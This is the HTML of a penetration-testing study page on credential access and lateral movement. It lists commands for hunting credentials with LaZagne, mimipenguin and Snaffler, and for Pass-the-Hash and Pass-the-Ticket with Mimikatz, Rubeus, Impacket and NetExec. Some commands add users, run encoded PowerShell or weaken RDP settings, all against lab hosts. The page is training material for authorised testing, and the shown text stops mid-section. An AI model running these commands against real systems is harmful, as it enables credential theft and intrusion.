@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Credential access | Paracausal Telemetry</title>
+    <meta name="description" content="An interactive credential-access and lateral-movement reference: hunting credentials on Windows and Linux hosts, in cleartext network traffic and across SMB shares, then reusing them with Pass-the-Hash, Pass-the-Ticket and Pass-the-Certificate, plus defensive notes on password policy and managers. For authorised testing." />
+    <meta name="robots" content="index,follow" />
+    <meta name="theme-color" content="#0a0b0c" />
+    <meta name="referrer" content="strict-origin-when-cross-origin" />
+    <link rel="canonical" href="https://paracausaltelemetry.com/cpts/credential-access/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Paracausal Telemetry" />
+    <meta property="og:title" content="Credential access" />
+    <meta property="og:description" content="An interactive credential-access and lateral-movement reference: hunting credentials on Windows and Linux hosts, in cleartext network traffic and across SMB shares, then reusing them with Pass-the-Hash, Pass-the-Ticket and Pass-the-Certificate, plus defensive notes on password policy and managers. For authorised testing." />
+    <meta property="og:url" content="https://paracausaltelemetry.com/cpts/credential-access/" />
+    <meta property="og:image" content="https://paracausaltelemetry.com/src/social-preview.png?v=17f992b5" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content="https://paracausaltelemetry.com/src/social-preview.png?v=17f992b5" />
+    <link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" />
+    <link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin />
+    <link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin />
+    <link rel="stylesheet" href="/styles.css?v=276fa973-site9" />
+    <link rel="stylesheet" href="/cpts/password-cracking/pc-map.css?v=pc1" />
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Credential access & lateral movement: hunting credentials and passing hashes, tickets and certificates","description":"An interactive credential-access and lateral-movement reference: hunting credentials on Windows and Linux hosts, in cleartext network traffic and across SMB shares, then reusing them with Pass-the-Hash, Pass-the-Ticket and Pass-the-Certificate, plus defensive notes on password policy and managers. For authorised testing.","url":"https://paracausaltelemetry.com/cpts/credential-access/","isPartOf":{"@type":"CollectionPage","name":"CPTS","url":"https://paracausaltelemetry.com/cpts/"}}</script>
+  </head>
+  <body>
+    <script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script>
+    <a class="skip-to-content" href="#pc-main">Skip to the content</a>
+    <div class="page-shell">
+      <header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">CPTS</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/">Writeups</a><a href="/cpts/" aria-current="page">CPTS</a><a href="/links/">Links</a><a href="/talks/">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header>
+      <main id="pc-main" class="pc-main">
+        <nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/cpts/">CPTS</a><span>/</span><span aria-current="page">Credential access</span></nav>
+        <section class="page-hero">
+          <div class="page-hero-card">
+            <canvas class="hero-dither" aria-hidden="true"></canvas>
+            <div class="page-hero-copy">
+              <p class="eyebrow">CPTS &middot; Credential access & lateral movement</p>
+              <h1>Credential access<span class="signal-stop">.</span></h1>
+              <p>Once you have a foothold, the fastest way forward is usually a credential someone left lying around, and the fastest way across is to reuse one you already hold without ever cracking it. This map covers hunting credentials on Windows and Linux hosts, in cleartext network traffic and across SMB shares, then moving laterally with Pass-the-Hash, Pass-the-Ticket and Pass-the-Certificate. A short defensive section closes it out. Open any node for what it means and the commands behind it. Everything here is for systems you are authorised to test: hunting is quiet, but passing attacks authenticate as other users and are logged, so stay inside scope and keep every credential with the engagement notes.</p>
+              <p class="pc-hero-link"><a href="/cpts/">Full command reference on the CPTS page</a></p>
+            </div>
+          </div>
+        </section>
+        <section class="pc-map" aria-labelledby="pc-map-title">
+          <div class="pc-map-head">
+            <h2 id="pc-map-title">Credential access, step by area</h2>
+            <div class="pc-map-tools" hidden>
+              <button class="pc-tool-btn" type="button" data-expand="open">Open all</button>
+              <button class="pc-tool-btn" type="button" data-expand="close">Close all</button>
+            </div>
+          </div>
+          <ol class="pc-spine">
+          <li class="pc-phase" id="pcphase-hunt-win">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">01</span>
+              <h2 class="pc-phase-title" id="pcphase-hunt-win-title">Hunt credentials: Windows</h2>
+              <p class="pc-phase-blurb">Search the file system and installed applications for credentials users and admins left behind. Base the search on what the host is for: an IT admin&#39;s workstation hides different secrets to a kiosk.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node has-kids" id="pcnode-cw-approach">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Think like the user (key terms)</span></summary>
+                  <div class="pc-node-body"><p>Credential hunting is detailed searching across the file system and applications for stored secrets. Refine it with what you know about the host: ask what the owner does day to day and which of those tasks need a password. Useful key terms to grep and search for are password, passwd, pwd, creds, credential, key, passkey, login, user, username, configuration, dbpassword and dbcredential. Localise them to the target (a German firm is likelier to write Benutzer than user).</p></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-cw-winsearch">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Windows Search (GUI)</span></summary>
+                    <div class="pc-node-body"><p>With a desktop, the Start-menu search bar indexes OS settings and the file system; typing a key term such as pass surfaces matching files and settings quickly. A cheap first pass before reaching for tooling.</p></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node is-console" id="pcnode-cw-findstr">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">findstr (pattern search)</span></summary>
+                  <div class="pc-node-body"><p>findstr searches many file types for a pattern. /S recurses, /I is case-insensitive, /M prints only the matching filenames. Point it at the common text and config extensions with a key term, and widen the terms and extensions as leads appear.</p><pre class="pc-cmd"><code>findstr /SIM /C:&quot;password&quot; *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml
+findstr /SIM /C:&quot;pass&quot; *.xml *.config
+dir /s /b *pass* *cred* *.kdbx 2&gt;nul</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-cw-lazagne">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">LaZagne (stored app creds)</span></summary>
+                  <div class="pc-node-body"><p>LaZagne extracts credentials that browsers and other applications store insecurely. It is modular, each module targets different software; start LaZagne.exe all runs every module, and -vv shows what it is doing. Browsers are the richest target: LaZagne supports 35 of them on Windows, and stored browser passwords, though encrypted, are decryptable with tools like firefox_decrypt and decrypt-chrome-passwords. Keep a standalone LaZagne.exe on the attack host and copy it over (xfreerdp pastes straight into the session). The modules are in the table below.</p><pre class="pc-cmd"><code>start LaZagne.exe all
+LaZagne.exe all -vv
+LaZagne.exe browsers</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node" id="pcnode-cw-locations">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Common stash locations</span></summary>
+                  <div class="pc-node-body"><p>Beyond app stores, credentials turn up in predictable places. On a domain: Group Policy Preferences and scripts in the SYSVOL share, the AD user or computer description fields, and web.config on dev and IT shares. On any host: Unattend.xml / sysprep.inf (base64 or plaintext admin passwords), KeePass .kdbx databases (crack the master), and files named pass.txt, passwords.docx or passwords.xlsx on user systems, shares and SharePoint. IT shares outrank the company photo share, be strategic.</p></div>
+                </details>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-hunt-linux" data-to="hunt-linux"><span aria-hidden="true">&#8595;</span> Proceed to Hunt credentials: Linux</a>
+          </li>
+          <li class="pc-phase" id="pcphase-hunt-linux">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">02</span>
+              <h2 class="pc-phase-title" id="pcphase-hunt-linux-title">Hunt credentials: Linux</h2>
+              <p class="pc-phase-blurb">On Linux everything is a file, so most of the hunt is finding and filtering the right ones: configs, databases, notes, scripts, cron, history and logs, then memory and browser stores.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node is-console" id="pcnode-cl-files">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Files: configs, DBs, notes, scripts</span></summary>
+                  <div class="pc-node-body"><p>Configuration files are the core of services and often hold credentials; the usual extensions are .conf, .config and .cnf (though they can be renamed). Find them, then grep each for user/pass. Apply the same sweep to databases (.sql, .db) and scripts (.py, .sh, .pl), which frequently embed credentials so they can run unattended. Notes have no fixed extension, so search .txt and extension-less files in home directories.</p><pre class="pc-cmd"><code>for l in .conf .config .cnf; do echo &quot;[$l]&quot;; find / -name &quot;*$l&quot; 2&gt;/dev/null | grep -v &quot;lib\|fonts\|share\|core&quot;; done
+for i in $(find / -name &#39;*.cnf&#39; 2&gt;/dev/null | grep -v &quot;doc\|lib&quot;); do echo &quot;$i&quot;; grep -i &quot;user\|pass&quot; &quot;$i&quot; 2&gt;/dev/null | grep -v &quot;#&quot;; done
+find / -name &quot;*.sql&quot; -o -name &quot;*.db&quot; 2&gt;/dev/null | grep -v &quot;doc\|lib\|share&quot;
+find /home/* -type f -name &quot;*.txt&quot; -o ! -name &quot;*.*&quot;</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-cl-history">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">History &amp; logs</span></summary>
+                  <div class="pc-node-body"><p>Shell history captures typed credentials: tail the .bash_history, .bashrc and .bash_profile of each user (a su followed by a script argument is a gift). System logs in /var/log record authentication and command activity; grep them for session, accepted, failed, sudo and COMMAND= lines. The important log files are in the table below.</p><pre class="pc-cmd"><code>tail -n 20 /home/*/.bash*
+grep -riE &#39;password|pass=|secret&#39; /home 2&gt;/dev/null
+for i in $(ls /var/log/* 2&gt;/dev/null); do grep -l &quot;accepted\|session opened\|sudo\|COMMAND=&quot; &quot;$i&quot; 2&gt;/dev/null; done</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-cl-memory">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Memory &amp; cache</span></summary>
+                  <div class="pc-node-body"><p>Applications keep credentials in memory to reuse them. mimipenguin dumps cleartext passwords for logged-in users from memory and files (needs root). LaZagne works on Linux too, pulling from the shadow file, keyrings (libsecret, KWallet), browsers, SSH, GPG, Docker, KeePass, AWS, FileZilla and more, far more sources than on Windows. Keyrings are the OS password manager: encrypted stores unlocked by a master password.</p><pre class="pc-cmd"><code>sudo python3 mimipenguin.py
+sudo python3 laZagne.py all
+sudo python3 laZagne.py browsers</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-cl-browser">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Browser credentials (Firefox)</span></summary>
+                  <div class="pc-node-body"><p>Firefox stores saved logins encrypted in logins.json inside the profile directory (.mozilla/firefox/&lt;profile&gt;.default-release). Encrypted is not safe: firefox_decrypt (Python 3.9+) reads the profile and prints the plaintext website, username and password; LaZagne&#39;s browsers module does the same. Copy the profile off the host and decrypt it on the attack box.</p><pre class="pc-cmd"><code>ls -l .mozilla/firefox/ | grep default
+cat .mozilla/firefox/*.default-release/logins.json | jq .
+python3.9 firefox_decrypt.py</code></pre></div>
+                </details>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-hunt-net" data-to="hunt-net"><span aria-hidden="true">&#8595;</span> Proceed to Hunt credentials: network</a>
+          </li>
+          <li class="pc-phase" id="pcphase-hunt-net">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">03</span>
+              <h2 class="pc-phase-title" id="pcphase-hunt-net-title">Hunt credentials: traffic &amp; shares</h2>
+              <p class="pc-phase-blurb">Credentials in motion and credentials at rest on shares. Sniff cleartext protocols for logins, and spider SMB shares for secrets left in files.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node has-kids" id="pcnode-cn-traffic">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Cleartext protocols (Wireshark)</span></summary>
+                  <div class="pc-node-body"><p>Legacy systems, misconfigurations and test services still use unencrypted protocols (HTTP, FTP, SNMP, POP3, IMAP, SMTP, LDAP, Telnet) that carry credentials in the clear. Wireshark&#39;s filter engine searches live or captured traffic: filter to a protocol, follow a TCP stream, or use a content filter like http contains &quot;passw&quot; (or Edit &gt; Find Packet) to jump to a login. An HTTP POST (http.request.method == &quot;POST&quot;) over cleartext often holds the username and password in the form data. The common filters and the plaintext/encrypted protocol pairs are in the tables below.</p></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node is-console" id="pcnode-cn-pcredz">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Pcredz (automated extraction)</span></summary>
+                    <div class="pc-node-body"><p>Pcredz scans a live interface or a pcap and pulls credentials automatically: HTTP Basic/NTLM and form logins, FTP, POP/SMTP/IMAP, SNMP community strings, credit-card numbers, NTLMv1/v2 hashes from SMB/LDAP/MSSQL/HTTP/DCE-RPC, and Kerberos AS-REQ pre-auth hashes. Run it against a capture with -f; -t parses TCPDump format and -v is verbose.</p><pre class="pc-cmd"><code>./Pcredz -f capture.pcapng -t -v</code></pre></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node is-console" id="pcnode-cn-shares-win">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Spider shares from Windows</span></summary>
+                  <div class="pc-node-body"><p>Snaffler, run on a domain-joined host, finds readable shares across the domain and flags interesting files by name, extension and content, colour-coding hits (red is high interest). It is noisy with output and false positives; -u searches for references to AD users, -i and -n scope which shares are included. PowerHuntShares does not need a domain-joined host and writes an HTML report of shares, permissions and high-risk access.</p><pre class="pc-cmd"><code>Snaffler.exe -s
+Snaffler.exe -s -o snaffler.log
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-cn-shares-linux">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Spider shares from Linux</span></summary>
+                  <div class="pc-node-body"><p>From a non-domain host, MANSPIDER (best run from its Docker container) scans SMB shares for a string in file content (-c) with supplied credentials. NetExec spiders shares with --spider on a protocol: point it at a share, add --content and a --pattern to grep file contents. Both pull matching files back for review. Start with a keyword like passw and narrow from there.</p><pre class="pc-cmd"><code>docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c passw -u mendres -p &#39;Password!&#39;
+nxc smb 10.129.234.121 -u mendres -p &#39;Password!&#39; --spider IT --content --pattern passw
+nxc smb 10.129.234.121 -u mendres -p &#39;Password!&#39; --shares</code></pre></div>
+                </details>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-pth" data-to="pth"><span aria-hidden="true">&#8595;</span> Proceed to Pass the Hash</a>
+          </li>
+          <li class="pc-phase" id="pcphase-pth">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">04</span>
+              <h2 class="pc-phase-title" id="pcphase-pth-title">Pass the Hash (PtH)</h2>
+              <p class="pc-phase-blurb">Authenticate with an NTLM hash instead of the plaintext password. Because NTLM hashes are unsalted and static until the password changes, a dumped hash is a login, no cracking needed.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node" id="pcnode-pth-what">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">NTLM &amp; the PtH idea</span></summary>
+                  <div class="pc-node-body"><p>NTLM is a challenge-response SSO protocol still kept for legacy compatibility, though Kerberos is the default in AD. Passwords on the server and DC are not salted, so an attacker holding the NTLM hash can authenticate a session without ever knowing or cracking the password: Pass the Hash. You need admin or specific rights on the source to get a hash, from the local SAM, the DC&#39;s NTDS.dit, or LSASS memory. The tools, by platform, are in the table below.</p></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-pth-mimikatz">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Mimikatz sekurlsa::pth (Windows)</span></summary>
+                  <div class="pc-node-body"><p>Mimikatz&#39;s sekurlsa::pth starts a process under a user&#39;s context using their NTLM hash. Supply /user, /rc4 or /NTLM (the hash), /domain (for a local account use the computer name, localhost or a dot) and /run (the program; defaults to cmd.exe). The new cmd.exe then authenticates to network resources as that user.</p><pre class="pc-cmd"><code>mimikatz.exe privilege::debug &quot;sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe&quot; exit</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-pth-invoke">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Invoke-TheHash (Windows)</span></summary>
+                  <div class="pc-node-body"><p>Invoke-TheHash is a set of PowerShell functions for PtH over SMB or WMI via the .NET TCPClient, authenticating the NTLM hash into NTLMv2. No local admin is needed client-side, but the user and hash must have admin rights on the target. Invoke-SMBExec and Invoke-WMIExec take -Target, -Username, -Hash, -Domain and -Command; the target can be a hostname or IP.</p><pre class="pc-cmd"><code>Import-Module .\Invoke-TheHash.psd1
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command &quot;net user mark Password123 /add&quot; -Verbose
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command &quot;powershell -e &lt;base64&gt;&quot;</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-pth-impacket">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Impacket (Linux)</span></summary>
+                  <div class="pc-node-body"><p>Impacket&#39;s execution tools take -hashes LMHASH:NTHASH (leave the LM half empty with a leading colon) for PtH. psexec drops a service for a SYSTEM shell; wmiexec, atexec and smbexec give quieter semi-interactive execution over WMI, the task scheduler and SMB respectively.</p><pre class="pc-cmd"><code>impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-pth-nxc">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">NetExec &amp; spraying (Linux)</span></summary>
+                  <div class="pc-node-body"><p>NetExec authenticates a hash across a host or a whole subnet with -H, so you can test local-admin password reuse at scale (gold images often share one local admin password). (Pwn3d!) means local admin; -x runs a command. Use -d . with --local-auth for local accounts, and mind the account lockout policy when spraying domain accounts.</p><pre class="pc-cmd"><code>netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+netexec smb 172.16.1.0/24 -u Administrator --local-auth -H 30B3783CE2ABF1AF70F77D0660CF3453
+netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-pth-evilwinrm">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Evil-WinRM &amp; RDP (Linux)</span></summary>
+                  <div class="pc-node-body"><p>If SMB is blocked or you lack admin, Evil-WinRM passes the hash over WinRM with -H (prefix the user with the domain for a domain account). xfreerdp passes it over RDP with /pth, but the target needs Restricted Admin Mode enabled (set DisableRestrictedAdmin to 0 under HKLM\System\CurrentControlSet\Control\Lsa), or the connection is refused.</p><pre class="pc-cmd"><code>evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node" id="pcnode-pth-uac">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">UAC limits PtH for local accounts</span></summary>
+                  <div class="pc-node-body"><p>UAC remote restriction caps PtH with local accounts. When LocalAccountTokenFilterPolicy (under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System) is 0, only the built-in RID-500 Administrator can do remote admin; setting it to 1 enables the other local admins. The exception: if FilterAdministratorToken is enabled, even the RID-500 account is under UAC protection and remote PtH fails against it. These limits apply only to local accounts, a domain account with admin rights on the box still passes freely.</p></div>
+                </details>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-ptt" data-to="ptt"><span aria-hidden="true">&#8595;</span> Proceed to Pass the Ticket</a>
+          </li>
+          <li class="pc-phase" id="pcphase-ptt">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">05</span>
+              <h2 class="pc-phase-title" id="pcphase-ptt-title">Pass the Ticket (PtT)</h2>
+              <p class="pc-phase-blurb">Move laterally with a stolen Kerberos ticket instead of a hash. Harvest tickets from LSASS (Windows) or ccache/keytab files (Linux), then inject them into a session.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node" id="pcnode-ptt-concept">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">TGT, TGS &amp; the PtT idea</span></summary>
+                  <div class="pc-node-body"><p>Kerberos is ticket-based: the Ticket Granting Ticket (TGT), obtained by encrypting a timestamp with your password hash, is exchanged at the KDC for per-service Ticket Granting Service (TGS) tickets. Steal either and you can authenticate as that user, a TGT lets you request service tickets for anything they can reach; a TGS grants one specific resource. On Windows, tickets live in LSASS; on Linux, in ccache or keytab files.</p></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ptt-harvest-win">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Harvest tickets (Windows)</span></summary>
+                  <div class="pc-node-body"><p>As local admin you can collect every session&#39;s tickets; as a normal user, only your own. Mimikatz sekurlsa::tickets /export writes each ticket to a .kirbi file (tickets ending in $ are computer accounts; a krbtgt ticket is a TGT). Rubeus dump prints tickets as Base64 (/nowrap for easy copy). Run either elevated to get all tickets.</p><pre class="pc-cmd"><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit
+Rubeus.exe dump /nowrap
+dir *.kirbi</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ptt-overpass">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">OverPass-the-Hash / Pass-the-Key</span></summary>
+                  <div class="pc-node-body"><p>Pass-the-Key (OverPass-the-Hash) turns a user&#39;s key (rc4/aes128/aes256) into a full TGT. Dump the keys with Mimikatz sekurlsa::ekeys, then either sekurlsa::pth with the hash, or Rubeus asktgt with /rc4, /aes128 or /aes256. Prefer the AES key: in modern domains (2008+) AES is default, and feeding an rc4 (NTLM) key into a Kerberos exchange can flag as an encryption downgrade. Rubeus needs no admin for asktgt; Mimikatz does.</p><pre class="pc-cmd"><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; exit
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc...fda3fe60 /nowrap
+mimikatz.exe &quot;sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f&quot;</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ptt-use-win">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Import a ticket (Windows)</span></summary>
+                  <div class="pc-node-body"><p>Inject a ticket into the current logon session, then use any Kerberos service as that user. Rubeus asktgt /ptt requests and imports in one step; Rubeus ptt /ticket:&lt;file-or-base64&gt; imports an existing ticket; Mimikatz kerberos::ptt &lt;file.kirbi&gt; does the same. For a non-admin target where you are in Remote Management Users, pair a ticket with Enter-PSSession (PowerShell Remoting); Rubeus createnetonly makes a sacrificial logon session so you do not clobber your own TGTs.</p><pre class="pc-cmd"><code>Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd...13f11dc /ptt
+Rubeus.exe ptt /ticket:ticket.kirbi
+mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot; exit
+Enter-PSSession -ComputerName DC01</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node has-kids" id="pcnode-ptt-linux">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Tickets on Linux (ccache &amp; keytab)</span></summary>
+                  <div class="pc-node-body"><p>A domain-joined Linux host (check with realm list, or ps -ef for sssd/winbind) stores Kerberos tickets as ccache files in /tmp (path in KRB5CCNAME) and as keytab files (principal-to-key pairs for unattended auth, often .keytab, /etc/krb5.keytab for the machine account). ccache files need only read access; keytabs need read/write. Find them, impersonate with the right tool, then reuse against the domain. The storage types are in the table below.</p></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node is-console" id="pcnode-pl-find">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Find &amp; use tickets</span></summary>
+                    <div class="pc-node-body"><p>Find keytabs by name and ccache files in /tmp. klist -k -t reads a keytab&#39;s principal; kinit -k -t imports it as that user; set KRB5CCNAME to a readable ccache to assume it. With root you can read any user&#39;s ccache, including a Domain Admin&#39;s.</p><pre class="pc-cmd"><code>find / -name &#39;*keytab*&#39; -ls 2&gt;/dev/null
+ls -la /tmp/krb5cc_*
+klist -k -t /opt/carlos.keytab
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/carlos.keytab
+export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-pl-extract">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">KeyTabExtract (hashes from keytab)</span></summary>
+                    <div class="pc-node-body"><p>KeyTabExtract pulls the realm, principal and hashes (NTLM, AES-256, AES-128) out of a keytab. The NTLM hash feeds a Pass-the-Hash; the AES keys forge tickets with Rubeus or crack to plaintext. A keytab can hold several users&#39; credentials.</p><pre class="pc-cmd"><code>python3 keytabextract.py /opt/carlos.keytab</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-pl-convert">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">ticketConverter &amp; Linikatz</span></summary>
